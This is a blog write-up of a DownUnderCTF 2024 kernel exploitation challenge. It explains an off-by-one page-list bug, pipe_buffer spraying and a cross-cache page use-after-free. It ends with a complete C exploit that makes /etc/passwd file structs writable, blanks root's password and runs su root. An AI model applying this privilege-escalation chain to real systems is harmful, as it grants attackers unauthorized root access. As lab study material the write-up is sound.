---
title: "Page Struct UAF: (DownUnderCTF 2024)"
date: 2024-07-18 19:00:00
tags: 
layout: default
---

# 0x00 Introduction

To practice kernel exploitation, I plan to solve old CTF challenges and learn different skills from others. This is a reproducing write-up. I was working on AIxCC so didn't play DownUnderCTF with r3kapig and this challenge is solved by `@lotus` in the game. 

# 0x01 Challenge

[Attachment][2]

This is a kernel challenge from DownUnderCTF 2024. 

This challenge includes a kernel module maintaining a list of pages. The users can use the pages by `mmap`.

The bug is in function `dev_vma_fault`: 

```c
static vm_fault_t dev_vma_fault(struct vm_fault *vmf) {
    struct vm_area_struct *vma = vmf->vma;
    struct shared_buffer *sbuf = vma->vm_private_data;

    pgoff_t pgoff = vmf->pgoff;

        if (pgoff > sbuf->pagecount) {
            return VM_FAULT_SIGBUS;
 }

    get_page(sbuf->pages[pgoff]);
    vmf->page = sbuf->pages[pgoff];

    return SUCCESS;
}
```
In the if statement, there is one slot off, which should be corrected to `pgoff >= sbuf->pagecount`. Thus, if `pgoff == 0x80`, we can operate the page struct at the slot out of bound. To exploit the bug, we should figure out 
- How to set pgoff to 0x80
- How to put/fake a page struct at the out-of-bound slot
- How to get root privilege after we gain the page UAF


# 0x02 pgoff

If we mmap pages in the user space without operating these pages, these pages are not allocated to make allocation faster. When we try to read/write these pages, `vm_fault` is triggered and the corresponding handler will be executed. They allocate pages, and then user space is able to perform further operations. 

`struct vm_fault *vmf` is the parameter passed to the `vm_fault` handler. The `pgoff` element is the page index between the target page and the start of the vma. In this challenge, it's the operated page and the start of the file (check `dev_mmap`). Because of the check of the max `mmap` page, we need at least set the last parameter of `mmap` to 0x1000 if we allocate 0x80 pages or we can allocate 0x1 page by setting the offset to 0x80000.

```c
__u8 *res = mmap(0xdeadbeef000,0x1000,0x7,1,fd,0x80000);
*res = 0; // Trigger the bug
```

Then, any read/write operation on the OOB page will trigger the bug.

# 0x03 page struct

In this challenge, we have OOB access to a page list. So we have to put/fake a page struct at the oob slot. It's complex to fake a page struct at the oob slot since we didn't leak any address so using some struct to put a page struct at the oob slot could be easier. 

Considering the vulnerable object in the challenge (`size == 0x400` / `GFP_KERNEL` / `CONFIG_MEMCG=n`), I used `pipe_buffer`.
```c
struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
};
```

As we see in the structure, a pointer of the page struct is at the start of the struct which will be at the oob slot. To allocate `pipe_buffer` struct next to the target object (0x400), we have to use `pipe_fcntl` to resize the size. 

```c
int pipe_resize_ring(struct pipe_inode_info *pipe, unsigned int nr_slots)
{
    struct pipe_buffer *bufs;
    unsigned int head, tail, mask, n;

 bufs = kcalloc(nr_slots, sizeof(*bufs),
 GFP_KERNEL_ACCOUNT | __GFP_NOWARN);
    if (unlikely(!bufs))
        return -ENOMEM;
...
```

When we resize the pipe, each new page requires a new `pipe_buffer` struct the allocation is in the function `pipe_resize_ring`, where `nr_slots` is decied by the new size.

For example, if we call `fcntl(fd,F_SETPIPE_SZ,0x1000*count);`, `nr_slots`==`count`. However, there is a limit for the value of count: it must be `pow(2,n)` (e.g., 0,1,2,4,8...). Considering the struct size of `pipe_buffer` is 0x28, we can set `pipe_buffer`s in the slab sizes of 0x40, 128, 192, ...

Back to the challenge, the size of `pipe_buffer` arrary should be 0x400, which means we need 0x10 `pipe_buffer`s: `0x400 > (0x28 * 0x10) > 0x200`. 


```
 pipeBufferResize(pipe_fd[0][0],16);
 pipeBufferResize(pipe_fd[0][1],16);
 pipeBufferResize(pipe_fd[1][0],16);
 pipeBufferResize(pipe_fd[1][1],16);
 fd = open("/dev/challenge",2);
 pipeBufferResize(pipe_fd[2][0],16);
 pipeBufferResize(pipe_fd[2][1],16);
 pipeBufferResize(pipe_fd[3][0],16);
 pipeBufferResize(pipe_fd[3][1],16);
```

By spraying `pipe_buffer` array based on the code above, I place a page struct at the oob slot. 

# 0x04 Primitives

This oob is actually a UAF: 
- Place a page struct at the oob slot
- Free the pages where the page struct points to
- Operate the oob slot

Luckily, closing the pipes will not clean the metadata on the `pipe_buffer` struct so we can still operate the page struct. Considering the freed page is collected, cross-cache techniques could be applied. I used to do control flow hijacking after I had UAF but I noticed @lotus used a simpler solution:

- [Cross Cache Attack][1] and refill with file structs of `/etc/passwd`
- Modify the `f_mode;` to `0x004f801f` to enable writing.
- Reset the password of the root
- Login as root

This solution is simpler and doesn't require control flow hijacking.

# 0x05 Exploit Script

```c
// https://github.com/n132/libx/tree/main
// gcc main.c -o ./main -lx -w
#include "libx.h"
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#if defined(LIBX)
    size_t user_cs, user_ss, user_rflags, user_sp;
    void saveStatus()
 {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
 );
        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
 }
    size_t back2root = shell;
    void back2userImp(){
        __asm__("mov rax, user_ss;"
            "push rax;"
            "mov rax, user_sp;"
            "push rax;"
            "mov rax, user_rflags;"
            "push rax;"
            "mov rax, user_cs;"
            "push rax;"
            "mov rax, back2root;"
            "push rax;"
            "swapgs;"
            "push 0;"
            "popfq;"
            "iretq;"
 );
 }
    // int sk_skt[SOCKET_NUM][2];
    int pipe_fd[PIPE_NUM][2];
    void libxInit(){
        back2user = back2userImp;
        hook_segfault();
        saveStatus();
        // initSocketArray(sk_skt);
        initPipeBuffer(pipe_fd);
 }
#endif // 
int fd = 0;
int main(){
    libxInit();
    msgSpray(0x3d0,0x100-3,dp('i',0x3d0));
    msgSpray(0xd0,0x100-3,dp('\x99',0x1d0));
    pipeBufferResize(pipe_fd[0][0],16);
    pipeBufferResize(pipe_fd[0][1],16);
    pipeBufferResize(pipe_fd[1][0],16);
    pipeBufferResize(pipe_fd[1][1],16);

 fd = open("/dev/challenge",2);
    pipeBufferResize(pipe_fd[2][0],16);
    pipeBufferResize(pipe_fd[2][1],16);
    pipeBufferResize(pipe_fd[3][0],16);
    pipeBufferResize(pipe_fd[3][1],16);
 __u8 *res = mmap(0xdeadbeef000,0x1000,0x7,1,fd,0x80000);
    warn(hex(res));
    
    for(int i = 0 ; i < 0x4 ; i ++){
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
 }
    // debug();
    int fds[0x300] = {0}; 
    for(int i = 0 ; i < 0x200 ; i++)
        fds[i] = open("/etc/passwd",0);
    unsigned int *file_mode = res+20;
    *file_mode = 0x004f801f; // Change mode to writable;
    for(int i = 0 ; i < 0x200 ; i++)
        write(fds[i],"root::0:0:root:/root:/bin/sh\n",30);
    system("/bin/su root");
    debug();
}
```


# 0x06 Epilogue

I checked the official write-up and found they didn't set the offset of mmap but used `mremap` to bypass the check in the function `dev_mmap`.


In this challenge, I learned. 

- The method to gain root without control flow hijacking
  - Cross Cache Attack File struct of `/etc/passwd`
  - Make it writeable 
  - Reset Password
- Exploit a Page Struct List OOB 
- Misc about `mmap`/`mremap` and `vm_fault`





[1]: https://n132.github.io/2024/02/29/IPS-Cross-Slab-Attack.html
[2]: https://github.com/DownUnderCTF/Challenges_2024_Public/tree/main/pwn/faulty-kernel
